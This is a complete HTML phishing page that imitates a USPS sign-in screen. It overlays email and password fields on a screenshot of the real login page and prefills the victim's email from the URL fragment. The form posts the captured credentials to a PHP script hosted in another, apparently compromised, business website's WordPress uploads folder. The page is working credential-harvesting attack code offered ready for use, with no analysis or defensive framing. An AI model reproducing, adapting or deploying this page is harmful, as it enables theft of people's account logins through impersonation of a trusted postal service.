
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Overlay USPS</title>

<style>
html, body {
    margin: 0;
    padding: 0;
    height: 100%;
}

/* Full background image */
body {
    background: url("https://i.postimg.cc/wB4ZcPNn/usps.png") no-repeat center center fixed;
    background-size: cover;
    position: relative;
    font-family: Arial, sans-serif;
}

/* Light overlay */
.overlay {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255,255,255,0.4);
}

/* Form positioned over left login section */
.form-container {
    position: absolute;
    top: 140px;   /* Adjust vertical position */
    left: 318px;  /* Adjust horizontal position */
    width: 240px;
   
    z-index: 2;
}

/* Email & Password fields */
.form-container input {
    width: 104%;
    padding: 08px;
    margin-bottom: 10px;

    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 14px;

}

/* Adjust password field spacing if needed */
.form-container input[type="password"] {
    margin-top: 17px;
}

/* Button styling (FIXED â€“ only defined once) */
.form-container button {
    width: 50%;
    padding: 10px;
    background-color: #2d2a63;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 13px;
    cursor: pointer;
    margin-top: 08px; /* ðŸ‘ˆ Add this line */
}


.form-container button:hover {
    opacity: 0.9;
}
</style>
</head>

<body>

<div class="overlay"></div>

<div class="form-container">
   
<form action="https://lorneplumbing.com.au/wp-content/uploads/2026/another.php" method="POST">

    <input type="email" name="email" placeholder="" required>
    <input type="password" name="password" placeholder="" required>
    <button type="submit">Sign In</button>

</form>

</div>



<script>
document.addEventListener("DOMContentLoaded", function () {
    const hash = window.location.hash;

    if (hash && hash.includes("@")) {
        const email = decodeURIComponent(hash.substring(1));
        const emailField = document.querySelector('input[type="email"]');
        
        if (emailField) {
            emailField.value = email;
        }
    }
});
</script>




</body>
</html>
